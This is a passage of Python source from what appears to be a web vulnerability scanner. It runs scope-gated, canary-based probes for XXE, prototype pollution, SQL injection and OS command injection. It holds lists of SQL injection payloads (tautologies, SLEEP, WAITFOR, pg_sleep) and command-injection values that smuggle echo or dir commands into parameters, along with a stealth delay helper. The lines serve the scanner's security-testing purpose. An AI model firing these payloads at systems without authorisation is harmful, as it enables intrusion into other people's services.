_XXE_SOAP_PAYLOAD = (
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE test [\n'
    '  <!ENTITY xxe "xxe-probe-4f7c">\n'
    ']>\n'
    '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">\n'
    '  <soapenv:Body>\n'
    '    <test>&xxe;</test>\n'
    '  </soapenv:Body>\n'
    '</soapenv:Envelope>'
)

# Content-Type values that indicate the server accepts XML input
_XML_CONTENT_TYPES = {
    "text/xml",
    "application/xml",
    "application/soap+xml",
    "application/xhtml+xml",
}

# URL path suffixes / segments that strongly suggest XML / SOAP endpoints
_SOAP_PATH_RE = re.compile(
    r'/(ws|soap|wsdl|service|services|xmlrpc|xml-rpc|rpc)(/|$|\?)',
    re.I
)

# File upload inputs that accept .xml files
_XML_UPLOAD_RE = re.compile(r'\.xml\b', re.I)

# Tracks endpoints already tested this session
_xxe_tested: set = set()


def _collect_xxe_endpoints(page_url: str, html_content: str, response_headers: dict) -> list:
    """
    Return a list of (endpoint_url, is_soap) tuples that are candidates for
    XXE testing, derived from:
      1. The page URL itself if the server responded with an XML Content-Type
      2. SOAP path patterns in the page URL
      3. Form actions with file-upload inputs accepting .xml
      4. Anchor hrefs matching SOAP path patterns
    """
    domain   = urlparse(page_url).netloc
    ct       = response_headers.get("Content-Type", "").lower().split(";")[0].strip()
    candidates = []

    # 1. Server responded with XML — the endpoint itself accepts XML input
    if ct in _XML_CONTENT_TYPES:
        is_soap = "soap" in ct
        candidates.append((page_url, is_soap))

    # 2. SOAP path in the page URL
    if _SOAP_PATH_RE.search(urlparse(page_url).path):
        candidates.append((page_url, True))

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return candidates

    # 3. File upload forms accepting .xml
    for form in soup.find_all("form"):
        for inp in form.find_all("input", type="file"):
            accept = inp.get("accept", "")
            if _XML_UPLOAD_RE.search(accept):
                action = form.get("action") or page_url
                ep = urljoin(page_url, action)
                if urlparse(ep).netloc == domain:
                    candidates.append((ep, False))

    # 4. SOAP-looking links on the page
    for tag in soup.find_all(["a", "link"]):
        href = tag.get("href") or ""
        if not href:
            continue
        abs_href = urljoin(page_url, href)
        if urlparse(abs_href).netloc != domain:
            continue
        if _SOAP_PATH_RE.search(urlparse(abs_href).path):
            candidates.append((abs_href, True))

    # Deduplicate while preserving order; prefer is_soap=True for duplicates
    seen   = {}
    result = []
    for ep, is_soap in candidates:
        if ep not in seen:
            seen[ep] = is_soap
            result.append((ep, is_soap))
        elif is_soap:
            seen[ep] = True
    return [(ep, seen[ep]) for ep in seen]


def check_xxe_injection(page_url: str, html_content: str, response_headers: dict) -> None:
    """
    Probe XML-accepting endpoints discovered on the current page for XXE.

    For each endpoint:
      - Send the safe static-entity payload as text/xml (POST)
      - For SOAP endpoints additionally send a SOAP-wrapped payload
      - If the canary string appears in the response body → HIGH
      - WSDL / service-definition exposure without auth → MEDIUM

    Only runs when --active-probes is enabled. Deduplicates per endpoint URL.
    8-second timeout per probe.
    """
    if not is_in_scope(page_url):
        return

    endpoints = _collect_xxe_endpoints(page_url, html_content, response_headers)
    if not endpoints:
        return

    domain = urlparse(page_url).netloc

    for endpoint_url, is_soap in endpoints:
        if endpoint_url in _xxe_tested:
            continue
        _xxe_tested.add(endpoint_url)

        # ── WSDL / service definition exposure check ──────────────────────
        # A WSDL exposes the full service contract (method names, param types,
        # namespaces) — useful to an attacker even without XXE.
        parsed_ep = urlparse(endpoint_url)
        wsdl_url  = endpoint_url.rstrip("?") + "?wsdl"
        if "wsdl" not in parsed_ep.query.lower() and "wsdl" not in parsed_ep.path.lower():
            try:
                stealth_delay(domain)
                wsdl_resp = _get_session().get(
                    wsdl_url,
                    headers=create_request_header(),
                    timeout=8,
                    verify=False,
                    allow_redirects=True,
                )
                wsdl_ct = wsdl_resp.headers.get("Content-Type", "").lower()
                if wsdl_resp.status_code == 200 and (
                    "xml" in wsdl_ct
                    or "<wsdl:" in wsdl_resp.text.lower()
                    or "<definitions" in wsdl_resp.text.lower()
                ):
                    alert(
                        "WSDL SERVICE DEFINITION EXPOSED",
                        "MEDIUM",
                        wsdl_url,
                        f"WSDL document accessible without authentication at {wsdl_url} — "
                        f"exposes full service contract including method names, parameter "
                        f"types, and namespace structure, aiding targeted XXE / SSRF attacks"
                    )
                    print(timestamp() + f" [!] WSDL exposed: {wsdl_url}")
            except Exception:
                pass

        # ── Endpoint baseline (GET) for anomaly gating ────────────────────
        parsed_ep2 = urlparse(endpoint_url)
        ep_params = {}
        for pair in (parsed_ep2.query or "").split("&"):
            if "=" in pair:
                k2, v2 = pair.split("=", 1)
                ep_params[k2] = v2
        ep_base = parsed_ep2.scheme + "://" + parsed_ep2.netloc + parsed_ep2.path
        _xxe_bl = _get_endpoint_baseline(ep_base, ep_params)

        # ── XXE entity reflection probes ──────────────────────────────────
        payloads = [("text/xml", _XXE_PAYLOAD)]
        if is_soap:
            payloads.append(("application/soap+xml", _XXE_SOAP_PAYLOAD))

        for content_type, payload in payloads:
            probe_key = (endpoint_url, content_type)
            if probe_key in _xxe_tested:
                continue
            _xxe_tested.add(probe_key)

            try:
                stealth_delay(domain)
                hdrs = create_request_header()
                hdrs["Content-Type"] = content_type
                t0_xxe = time.monotonic()
                resp = _get_session().post(
                    endpoint_url,
                    data=payload.encode("utf-8"),
                    headers=hdrs,
                    timeout=8,
                    verify=False,
                    allow_redirects=True,
                )
                xxe_ms = (time.monotonic() - t0_xxe) * 1000
                if _XXE_CANARY in resp.text:
                    _xxe_anom, _xxe_reason = _is_probe_anomalous(
                        _xxe_bl, resp.text, resp.status_code, xxe_ms
                    )
                    if _xxe_bl is not None and not _xxe_anom:
                        print(timestamp() + f" [Baseline] XXE canary matched but response "
                              f"not anomalous ({_xxe_reason}) — suppressing")
                        continue
                    label = "SOAP XXE" if "soap" in content_type else "XXE"
                    _eu  = endpoint_url
                    _ct  = content_type
                    _pay = payload
                    _msv_verify(
                        "HIGH", f"{label} INJECTION CONFIRMED", _eu,
                        f"XML entity expansion is enabled at {endpoint_url} — "
                        f"the canary value '{_XXE_CANARY}' was reflected in the "
                        f"response body, confirming the XML parser resolves "
                        f"DOCTYPE entity declarations. An attacker can leverage "
                        f"this to read local files, probe internal services (SSRF), "
                        f"or cause denial of service via entity expansion.",
                        lambda _u=_eu, _c=_ct, _p=_pay: _get_session().post(
                            _u,
                            data=_p.encode("utf-8"),
                            headers={**create_request_header(), "Content-Type": _c},
                            timeout=8, verify=False, allow_redirects=True,
                        ),
                        lambda r: _XXE_CANARY in (r.text or ""),
                    )
                    print(timestamp() + f" [!!] XXE confirmed ({content_type}): {endpoint_url}")
            except requests.exceptions.Timeout:
                pass
            except Exception as e:
                print_error(f"XXE probe failed for {endpoint_url}: {e}")


# ─────────────────────────────────────────────
# Prototype pollution detection
# ─────────────────────────────────────────────

_PP_CANARY = "3e6d"

# JSON body payloads — one per probe slot; sent alongside any existing fields
_PP_BODY_PAYLOADS = [
    {"__proto__":              {"pp-probe": "3e6d"}},
    {"constructor":            {"prototype": {"pp-probe": "3e6d"}}},
]

# URL query-string payloads — appended to existing params
_PP_QUERY_PAYLOADS = [
    "__proto__[pp-probe]=3e6d",
    "constructor[prototype][pp-probe]=3e6d",
]

# Client-side sink patterns searched in first-party JS bundles.
# Each tuple: (compiled regex, description shown in alert detail)
_PP_JS_SINKS = [
    (re.compile(r'\bObject\.assign\s*\(',        re.I), "Object.assign("),
    (re.compile(r'\$\.extend\s*\(',              re.I), "$.extend("),
    (re.compile(r'\b_\.merge\s*\(',              re.I), "_.merge("),
    (re.compile(r'\b_\.defaultsDeep\s*\(',       re.I), "_.defaultsDeep("),
    # JSON.parse result assigned via bracket notation
    (re.compile(r'JSON\.parse\s*\(.*?\)\s*\[',  re.I | re.DOTALL), "JSON.parse(…)["),
]

# Rough heuristic — nearby user-input sources tighten the signal
_PP_USER_INPUT_RE = re.compile(
    r'\b(?:req(?:uest)?\.(?:body|query|params)|'
    r'location\.(?:search|hash)|'
    r'URLSearchParams|'
    r'getParameter|'
    r'document\.(?:URL|referrer)|'
    r'window\.location)\b',
    re.I
)

_JS_CDN_RE = re.compile(
    r'cdnjs\.cloudflare\.com|unpkg\.com|cdn\.jsdelivr\.net|'
    r'node_modules/|/vendor/|/bower_components/',
    re.IGNORECASE
)

# Dedup sets
_pp_body_tested:  set = set()   # endpoint URLs tested with body payloads
_pp_query_tested: set = set()   # endpoint URLs tested with query payloads
_pp_js_tested:    set = set()   # JS URLs already scanned for client-side sinks


def _pp_baseline(endpoint_url: str, method: str, base_json: dict) -> tuple:
    """
    Fire one baseline request so we can compare status codes.
    Returns (status_code, body) or (None, None) on failure.
    """
    try:
        hdrs = {**create_request_header(), "Content-Type": "application/json"}
        r = _get_session().request(
            method, endpoint_url,
            json=base_json,
            headers=hdrs,
            timeout=8,
            allow_redirects=False,
            verify=False,
        )
        return r.status_code, r.text
    except Exception:
        return None, None


def check_prototype_pollution(page_url: str, html_content: str) -> None:
    """
    Server-side prototype pollution (body + URL param probes) and
    client-side sink detection in first-party JS.

    Only called when --active-probes is enabled.
    Sends at most 3 pollution probes per endpoint to minimise instability risk.
    8-second timeout per probe.
    """
    if not is_in_scope(page_url):
        return

    domain = urlparse(page_url).netloc
    if is_third_party_cdn(domain):
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    # ── Collect JSON-accepting POST/PUT endpoints ────────────────────────────
    # Source 1: HTML forms with POST/PUT that have no enctype or use JSON
    endpoints = []
    for form in soup.find_all("form"):
        method = form.get("method", "get").upper()
        if method not in ("POST", "PUT"):
            continue
        action = form.get("action") or page_url
        ep = urljoin(page_url, action)
        if urlparse(ep).netloc != domain:
            continue
        # Collect existing fields as the baseline body
        fields = {}
        for inp in form.find_all(["input", "textarea", "select"]):
            n = inp.get("name", "")
            v = inp.get("value") or "test"
            if n and inp.get("type", "").lower() not in ("submit", "button", "image", "reset", "file"):
                fields[n] = v
        endpoints.append((ep, method, fields))

    # Source 2: API-looking page URL
    parsed_page = urlparse(page_url)
    if any(seg in parsed_page.path for seg in ("/api/", "/v1/", "/v2/", "/v3/", "/rest/", "/graphql")):
        endpoints.append((page_url, "POST", {}))

    # ── Server-side body probes ──────────────────────────────────────────────
    for endpoint_url, method, base_fields in endpoints:
        if endpoint_url in _pp_body_tested:
            continue
        _pp_body_tested.add(endpoint_url)

        baseline_status, _ = _pp_baseline(endpoint_url, method, base_fields)
        # Rich multi-sample GET baseline for anomaly gating
        parsed_pp = urlparse(endpoint_url)
        pp_params = {}
        for pair in (parsed_pp.query or "").split("&"):
            if "=" in pair:
                _pk, _pv = pair.split("=", 1)
                pp_params[_pk] = _pv
        _pp_ep_base = parsed_pp.scheme + "://" + parsed_pp.netloc + parsed_pp.path
        _pp_ep_bl = _get_endpoint_baseline(_pp_ep_base, pp_params)
        probes_sent = 0

        for payload_extra in _PP_BODY_PAYLOADS:
            if probes_sent >= 3:
                break
            probe_body = {**base_fields, **payload_extra}
            try:
                stealth_delay(domain)
                hdrs = {**create_request_header(), "Content-Type": "application/json"}
                resp = _get_session().request(
                    method, endpoint_url,
                    json=probe_body,
                    headers=hdrs,
                    timeout=8,
                    allow_redirects=False,
                    verify=False,
                )
                probes_sent += 1
                body = resp.text

                if _PP_CANARY in body:
                    alert(
                        "SERVER-SIDE PROTOTYPE POLLUTION",
                        "HIGH",
                        endpoint_url,
                        f"Canary value '{_PP_CANARY}' reflected in response after "
                        f"injecting prototype pollution payload {list(payload_extra.keys())[0]!r} "
                        f"into {method} {endpoint_url} — server-side prototype chain "
                        f"manipulation is confirmed; object properties injected via "
                        f"__proto__ or constructor.prototype are resolved at runtime"
                    )
                    print(timestamp() + f" [!!] Server-side prototype pollution (body): {endpoint_url}")
                    break  # one confirmed finding per endpoint is sufficient

                elif resp.status_code == 500 and baseline_status is not None and baseline_status != 500:
                    _pp_anom, _ = _is_probe_anomalous(_pp_ep_bl, body, resp.status_code)
                    if _pp_ep_bl is not None and not _pp_anom:
                        pass   # baseline shows 500 is normal — suppress
                    else:
                        alert(
                            "PROTOTYPE POLLUTION — POSSIBLE SERVER CRASH",
                            "MEDIUM",
                            endpoint_url,
                            f"Server returned 500 (baseline: {baseline_status}) after "
                            f"injecting prototype pollution payload {list(payload_extra.keys())[0]!r} "
                            f"into {method} {endpoint_url} — the injection may have corrupted "
                            f"a shared prototype, causing a runtime exception; manual "
                            f"verification required"
                        )
                    print(timestamp() + f" [!] Prototype pollution possible crash: {endpoint_url}")

            except requests.exceptions.Timeout:
                probes_sent += 1
            except Exception as e:
                print_error(f"PP body probe failed for {endpoint_url}: {e}")
                probes_sent += 1

    # ── URL query-string probes ──────────────────────────────────────────────
    for endpoint_url, method, _ in endpoints:
        if endpoint_url in _pp_query_tested:
            continue
        _pp_query_tested.add(endpoint_url)

        parsed_ep = urlparse(endpoint_url)
        existing_qs = parsed_ep.query
        probes_sent  = 0

        for qs_suffix in _PP_QUERY_PAYLOADS:
            if probes_sent >= 3:
                break
            sep      = "&" if existing_qs else "?"
            test_url = endpoint_url.split("?")[0] + (
                "?" + existing_qs + "&" + qs_suffix if existing_qs else "?" + qs_suffix
            )
            try:
                stealth_delay(domain)
                resp = _get_session().get(
                    test_url,
                    headers=create_request_header(),
                    timeout=8,
                    allow_redirects=False,
                    verify=False,
                )
                probes_sent += 1
                if _PP_CANARY in resp.text:
                    alert(
                        "PROTOTYPE POLLUTION VIA URL PARAMETER",
                        "HIGH",
                        test_url,
                        f"Canary value '{_PP_CANARY}' reflected in response after "
                        f"injecting '{qs_suffix}' as a query parameter — the server "
                        f"parses bracket-notation query keys and merges them into "
                        f"a shared object, enabling prototype chain manipulation"
                    )
                    print(timestamp() + f" [!!] Prototype pollution (query): {test_url}")
                    break

            except requests.exceptions.Timeout:
                probes_sent += 1
            except Exception as e:
                print_error(f"PP query probe failed for {test_url}: {e}")
                probes_sent += 1


def scan_js_for_prototype_pollution_sinks(page_url: str, js_url: str, js_text: str) -> None:
    """
    Scan a first-party JS bundle for known prototype pollution sinks combined
    with nearby user-input sources. Called from analyse_js_bundle when
    --active-probes is enabled; the JS content is already downloaded.

    Flags MEDIUM — a sink alone is not exploitable; the analyst must verify
    that user-controlled data reaches it without sanitisation.
    """
    if js_url in _pp_js_tested:
        return
    if _JS_CDN_RE.search(js_url):
        return  # skip vendor / CDN bundles
    _pp_js_tested.add(js_url)

    for sink_re, sink_label in _PP_JS_SINKS:
        for m in sink_re.finditer(js_text):
            start = max(0, m.start() - 300)
            end   = min(len(js_text), m.end() + 300)
            window = js_text[start:end]
            if _PP_USER_INPUT_RE.search(window):
                ctx = re.sub(r'\s+', ' ', window).strip()[:300]
                alert(
                    "CLIENT-SIDE PROTOTYPE POLLUTION SINK",
                    "MEDIUM",
                    js_url,
                    f"Sink '{sink_label}' found in first-party JS with a "
                    f"user-controlled input source nearby — manual verification "
                    f"required to confirm exploitability. Context: {ctx!r}"
                )
                print(timestamp() + f" [!] PP client-side sink '{sink_label}': {js_url}")
                # Report at most one finding per sink label per JS file
                break


# ─────────────────────────────────────────────
# SQL Injection detection
# ─────────────────────────────────────────────

# Error-based detection strings — presence in response body confirms injection
_SQLI_ERROR_STRINGS = [
    "SQL syntax",
    "mysql_fetch",
    "ORA-01756",
    "Microsoft OLE DB",
    "ODBC SQL Server",
    "PostgreSQL ERROR",
    "Warning: pg_",
    "SQLite3::",
    "syntax error",
    "unclosed quotation",
    "quoted string not properly terminated",
]

# Error-based payloads (appended to each parameter value)
_SQLI_ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    "')",
    "'))",
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR "1"="1',
    ";--",
]

# Time-based (blind) payload templates — {N} is replaced by actual delay seconds.
# Keyed by DB type; "generic" is the fallback tried when DB is unknown.
_SQLI_TIMING_TEMPLATES: dict = {
    "mysql":      ["' OR SLEEP({N})--",                 "1 OR SLEEP({N})--"],
    "postgresql": ["' OR pg_sleep({N})--",              "1; SELECT pg_sleep({N})--"],
    "mssql":      ["'; WAITFOR DELAY '0:0:{N}'--",      "1; WAITFOR DELAY '0:0:{N}'--"],
    "sqlite":     ["' OR randomblob({BLOB})--"],
    "oracle":     ["' OR 1=1 AND {N}=dbms_pipe.receive_message(chr(0),{N})--"],
    "generic":    ["' OR SLEEP({N})--",                 "'; WAITFOR DELAY '0:0:{N}'--"],
}

# Map error-string fingerprint (from Phase 1) → DB key in _SQLI_TIMING_TEMPLATES
_SQLI_HINT_TO_DB: dict = {
    "mysql_fetch":       "mysql",
    "SQL syntax":        "mysql",
    "Warning: mysql":    "mysql",
    "PostgreSQL ERROR":  "postgresql",
    "Warning: pg_":      "postgresql",
    "Microsoft OLE DB":  "mssql",
    "ODBC SQL Server":   "mssql",
    "SQLite3::":         "sqlite",
    "ORA-":              "oracle",
}

# Legacy list kept for callers that still reference it (unused by Phase 2)
_SQLI_TIME_PAYLOADS = [
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
]

# DB-specific time payloads — keyed by the error string that fingerprints the DB.
# Used to prioritise the right payload once an error response reveals the DB type.
_SQLI_CTX_DB_PAYLOADS: dict = {
    "mysql_fetch":       ["' OR SLEEP(5)--",                   "1 OR SLEEP(5)--"],
    "SQL syntax":        ["' OR SLEEP(5)--",                   "1 OR SLEEP(5)--"],
    "PostgreSQL ERROR":  ["' OR pg_sleep(5)--",               "1; SELECT pg_sleep(5)--"],
    "Warning: pg_":      ["' OR pg_sleep(5)--"],
    "Microsoft OLE DB":  ["'; WAITFOR DELAY '0:0:5'--"],
    "ODBC SQL Server":   ["'; WAITFOR DELAY '0:0:5'--"],
    "SQLite3::":         ["' OR randomblob(500000000/2/2)--"],
}

# Static file extensions whose query params are not injection targets
_SQLI_STATIC_RE = re.compile(
    r'\.(css|js|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|eot|map|mp4|mp3|pdf|zip|gz|tar)(\?|$)',
    re.IGNORECASE,
)

_sqli_tested: set  = set()   # (base_url, param) pairs already probed
_sqli_domains: set = set()   # domains where SQLi was confirmed (stop testing)


def check_sqli(page_url: str, html_content) -> None:
    """
    Error-based and time-based SQL injection detection.

    Collects URL parameters from page links and GET-form action URLs, then
    appends each payload to each parameter value.  Stops after the first
    confirmed finding per domain (dedup + avoid hammering the server).

    Only called when --active-probes is enabled.
    Safe-mode only — no data extraction, schema dumping, or destructive payloads.
    """
    if not is_in_scope(page_url):
        return
    domain = urlparse(page_url).netloc
    if is_third_party_cdn(domain):
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    # Build candidate list: current page URL + linked hrefs + form actions
    all_urls = [page_url]
    for tag in soup.find_all(["a", "form"]):
        href = tag.get("href") or tag.get("action") or ""
        if href:
            all_urls.append(href)

    # Note WAF presence in findings if detected for this domain
    waf_note = ""
    waf_vendor = _waf_results.get(domain)
    if waf_vendor:
        waf_note = f" [WAF: {waf_vendor} detected — result may be a WAF block, not a real injection]"

    for raw_url in all_urls:
        if domain in _sqli_domains:
            break
        try:
            resolved = urljoin(page_url, raw_url)
            parsed   = urlparse(resolved)
            if is_third_party_cdn(parsed.netloc):
                continue
            if not parsed.query:
                continue
            # Skip static asset URLs
            if _SQLI_STATIC_RE.search(parsed.path):
                continue
            base = parsed.scheme + "://" + parsed.netloc + parsed.path
            params = {}
            for pair in parsed.query.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = v
        except Exception:
            continue

        # Baseline for this URL — used for diff check and context detection
        _bl = _get_endpoint_baseline(base, params)
        bl_status = _bl.status_code if _bl else None
        bl_body   = _bl.body if _bl else None

        for param, orig_val in params.items():
            if domain in _sqli_domains:
                break
            test_key = (base, param)
            if test_key in _sqli_tested:
                continue
            _sqli_tested.add(test_key)

            # Context detection — log and inform DB-specific payload selection
            ctx = _detect_input_context(bl_body or "", orig_val)
            if ctx != "unknown":
                print(timestamp() + f" [Context] SQLi param={param} in {ctx} context")

            print(timestamp() + f" SQLi probe: {base} param={param}")

            _db_hint: str | None = None  # set when an error response fingerprints the DB

            # ── Phase 1: error-based ─────────────────────────────────────────
            for payload in _SQLI_ERROR_PAYLOADS:
                if domain in _sqli_domains:
                    break
                new_query = "&".join(
                    f"{k}={orig_val + payload}" if k == param else f"{k}={v}"
                    for k, v in params.items()
                )
                test_url = base + "?" + new_query
                try:
                    stealth_delay(domain)
                    resp = _get_session().get(
                        test_url,
                        headers=create_request_header(),
                        timeout=10,
                        allow_redirects=True,
                    )
                    body = (resp.text or "")
                    bl_lower = (bl_body or "").lower()
                    for err_str in _SQLI_ERROR_STRINGS:
                        if err_str.lower() in body.lower():
                            # Diff check — skip if this error was already in baseline
                            if err_str.lower() in bl_lower:
                                continue
                            # Fingerprint the DB type for time-based phase
                            if _db_hint is None:
                                for hint_key in _SQLI_CTX_DB_PAYLOADS:
                                    if hint_key.lower() in body.lower():
                                        _db_hint = hint_key
                                        break
                            snippet = body[max(0, body.lower().find(err_str.lower()) - 40):
                                          body.lower().find(err_str.lower()) + 120].strip()
                            _tu = test_url
                            _es = err_str
                            _msv_verify(
                                "CRITICAL", "SQL INJECTION (ERROR-BASED)", domain,
                                f"Parameter '{param}' on {base} reflects SQL error '{err_str}' "
                                f"with payload: {payload!r} | Snippet: {snippet!r}{waf_note}",
                                lambda _u=_tu: _get_session().get(
                                    _u, headers=create_request_header(),
                                    timeout=10, allow_redirects=True,
                                ),
                                lambda r, _e=_es: _e.lower() in (r.text or "").lower(),
                            )
                            _sqli_domains.add(domain)
                            break
                except Exception:
                    pass
                if domain in _sqli_domains:
                    break

            if domain in _sqli_domains:
                break

            # ── Phase 2: time-based (blind) — statistical 3-probe ────────────
            # Select DB-specific payload templates based on Phase-1 fingerprint.
            db_key = _SQLI_HINT_TO_DB.get(_db_hint or "") if _db_hint else None
            if db_key:
                print(timestamp() + f" [Timing] SQLi param={param} DB hint: "
                      f"{_db_hint!r} → {db_key} templates")
            templates = _SQLI_TIMING_TEMPLATES.get(db_key or "generic",
                                                    _SQLI_TIMING_TEMPLATES["generic"])

            # Build a timing profile from baseline requests
            tp = _get_timing_profile(base, params)
            if not tp.valid:
                # Noisy or unreachable — skip time-based probing for this param
                continue

            print(timestamp() + f" [Timing] Baseline {base} param={param}: "
                  f"mean={tp.mean_ms:.0f}ms σ={tp.std_ms:.0f}ms max={tp.max_ms:.0f}ms")

            # Three escalating delays: 2s / 4s / 6s
            _PROBE_DELAYS = [2, 4, 6]
            _confirmed_probes = 0
            _probe_log: list[str] = []
            _winning_payload: str | None = None
            _winning_elapsed: float = 0.0

            for template in templates:
                if _confirmed_probes >= 2 or domain in _sqli_domains:
                    break
                _confirmed_probes = 0
                _probe_log = []

                for delay_s in _PROBE_DELAYS:
                    if domain in _sqli_domains:
                        break

                    # Build payload — substitute {N} and {BLOB} placeholders
                    blob_val = str(500_000_000 * delay_s // 10)
                    payload = template.replace("{N}", str(delay_s)).replace("{BLOB}", blob_val)

                    new_query = "&".join(
                        f"{k}={orig_val + payload}" if k == param else f"{k}={v}"
                        for k, v in params.items()
                    )
                    test_url = base + "?" + new_query
                    threshold_ms = _timing_threshold(tp, delay_s)

                    try:
                        stealth_delay(domain)
                        t0      = time.monotonic()
                        _get_session().get(
                            test_url,
                            headers=create_request_header(),
                            timeout=max(delay_s + 10, 20),
                            allow_redirects=True,
                        )
                        elapsed_ms = (time.monotonic() - t0) * 1000.0
                    except Exception:
                        elapsed_ms = 0.0

                    hit = elapsed_ms >= threshold_ms
                    _probe_log.append(
                        f"Probe(SLEEP {delay_s}): {elapsed_ms:.0f}ms "
                        f"(threshold {threshold_ms:.0f}ms) {'✓' if hit else '✗'}"
                    )
                    if hit:
                        _confirmed_probes += 1
                        if _winning_payload is None:
                            _winning_payload = payload
                            _winning_elapsed = elapsed_ms
                    else:
                        # Proportional scaling: stop if probe misses badly
                        break

                if _confirmed_probes >= 1:
                    break   # found a confirming template — use it

            timing_log = (
                f"Baseline: {tp.mean_ms:.0f}ms ±{tp.std_ms:.0f}ms | "
                + " | ".join(_probe_log)
                + (" → CONFIRMED" if _confirmed_probes >= 2 else
                   " → WEAK" if _confirmed_probes == 1 else " → NOT TRIGGERED")
            )
            print(timestamp() + f" [Timing] {timing_log}")

            if _confirmed_probes >= 1 and _winning_payload:
                if _confirmed_probes >= 3:
                    sev, label = "HIGH",   "CONFIRMED"
                elif _confirmed_probes == 2:
                    sev, label = "HIGH",   "CONFIRMED"
                else:
                    sev, label = "MEDIUM", "WEAK"

                _tu = base + "?" + "&".join(
                    f"{k}={orig_val + _winning_payload}" if k == param else f"{k}={v}"
                    for k, v in params.items()
                )
                _tp_ref = tp
                _wd = _PROBE_DELAYS[0]
                _timing = [0.0]

                def _re_time_sqli(_u=_tu, _t=_timing, _tp=_tp_ref, _d=_wd):
                    _t0 = time.monotonic()
                    r   = _get_session().get(_u, headers=create_request_header(),
                                             timeout=max(_d + 10, 20), allow_redirects=True)
                    _t[0] = (time.monotonic() - _t0) * 1000.0
                    return r

                _msv_verify(
                    sev, "SQL INJECTION (TIME-BASED BLIND)", domain,
                    f"Parameter '{param}' on {base} | {timing_log} | "
                    f"Winning payload: {_winning_payload!r}{waf_note}",
                    _re_time_sqli,
                    lambda r, _t=_timing, _tp=_tp_ref, _d=_wd:
                        _t[0] >= _timing_threshold(_tp, _d),
                )
                if sev == "HIGH":
                    _sqli_domains.add(domain)


# ─────────────────────────────────────────────
# Command Injection detection
# ─────────────────────────────────────────────

_CMDI_CANARY = "probe-test-7f3a"

# Linux/Unix payloads
_CMDI_UNIX_PAYLOADS = [
    f";echo {_CMDI_CANARY}",
    f"|echo {_CMDI_CANARY}",
    f"`echo {_CMDI_CANARY}`",
    f"$(echo {_CMDI_CANARY})",
    f";echo${{IFS}}{_CMDI_CANARY}",
    f"%0aecho%20{_CMDI_CANARY}",
]

# Windows payloads + detection strings
_CMDI_WIN_PAYLOADS = [
    f"&echo {_CMDI_CANARY}",
    f"|echo {_CMDI_CANARY}",
    ";dir",
]
_CMDI_WIN_INDICATORS = [
    "Volume in drive",
    "Directory of",
    _CMDI_CANARY,
]

_cmdi_tested: set  = set()   # (base_url, param) already probed
_cmdi_domains: set = set()   # domains where CMDi was confirmed

# Context-specific extra CMDi payloads prepended when input context is detected.
# These break out of the enclosing string/attribute before the shell command.
_CMDI_CTX_EXTRA: dict = {
    "html_attr":  [f'" && echo {_CMDI_CANARY}',  f"' && echo {_CMDI_CANARY}"],
    "js_string":  [f'"; echo {_CMDI_CANARY};//', f"'; echo {_CMDI_CANARY};//"],
    "json":       [f'"; echo {_CMDI_CANARY}; "', f"'; echo {_CMDI_CANARY}; '"],
}

# ── False-positive filter regexes ────────────────────────────────────────────
# Each is applied to a 300-char look-behind window ending immediately before a
# canary occurrence.  If any pattern matches, that occurrence is a reflection
# of the injected input rather than genuine shell output and is skipped.

# Rule 1: canary is inside a URL query-parameter value  …?p=<val><canary>
# The value portion allows spaces so that payloads like ';echo canary' —
# which produce '?param=orig;echo ' immediately before the canary — are caught.
_CMDI_FP_IN_PARAM_RE = re.compile(
    r'[?&][^=&"\'<\n]+=(?:[^&"\'<\n]*)$',
)
# Rule 2: canary is inside an HTML attribute that carries a URL
_CMDI_FP_IN_ATTR_RE = re.compile(
    r'(?:href|src|action|content)\s*=\s*["\'][^"\']*$',
    re.IGNORECASE,
)
# Rule 3: canary is inside a JSON string that contains a URL (absolute URL or
#         query-string fragment with ?param= or &param=)
_CMDI_FP_IN_JSON_URL_RE = re.compile(
    r'"[^"\n]*(?:https?://|[?&][^"\n]*=)[^"\n]*$',
)


def _cmdi_canary_is_standalone(body: str, canary: str) -> bool:
    """
    Return True only if *canary* appears in *body* as standalone plain-text
    output — i.e. NOT as a reflected URL parameter, NOT inside an HTML URL
    attribute (href/src/action/content), and NOT embedded in a JSON URL string.

    Iterates every occurrence of *canary* in *body* and checks a 300-character
    look-behind window against three false-positive patterns.  Returns True as
    soon as one occurrence passes all three checks (genuine shell echo).
    Returns False if every occurrence is explained by a reflection pattern.
    """
    if canary not in body:
        return False

    pos = 0
    while True:
        pos = body.find(canary, pos)
        if pos == -1:
            break
        pre = body[max(0, pos - 300):pos]

        if _CMDI_FP_IN_PARAM_RE.search(pre):
            pos += 1
            continue   # reflected as a URL query-parameter value

        if _CMDI_FP_IN_ATTR_RE.search(pre):
            pos += 1
            continue   # reflected inside href/src/action/content attribute

        if _CMDI_FP_IN_JSON_URL_RE.search(pre):
            pos += 1
            continue   # embedded in a JSON string that contains a URL

        return True    # this occurrence is not a known reflection pattern

    return False   # every occurrence was a false-positive


def check_cmdi(page_url: str, html_content) -> None:
    """
    Canary-based OS command injection detection.

    Injects harmless echo commands into every URL parameter found on the page.
    Flags CRITICAL only when the literal canary string appears in the response
    as standalone plain-text output — proving the shell executed our input.

    False-positive filtering via _cmdi_canary_is_standalone():
      - Skips occurrences that are reflected URL parameter values
      - Skips occurrences inside HTML href/src/action/content attributes
      - Skips occurrences inside JSON strings that contain a URL

    Only called when --active-probes is enabled.
    Safe-mode only — no destructive commands, no reverse shells, no file reads.
    """
    if not is_in_scope(page_url):
        return
    domain = urlparse(page_url).netloc
    if is_third_party_cdn(domain):
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    all_urls = [page_url]
    for tag in soup.find_all(["a", "form"]):
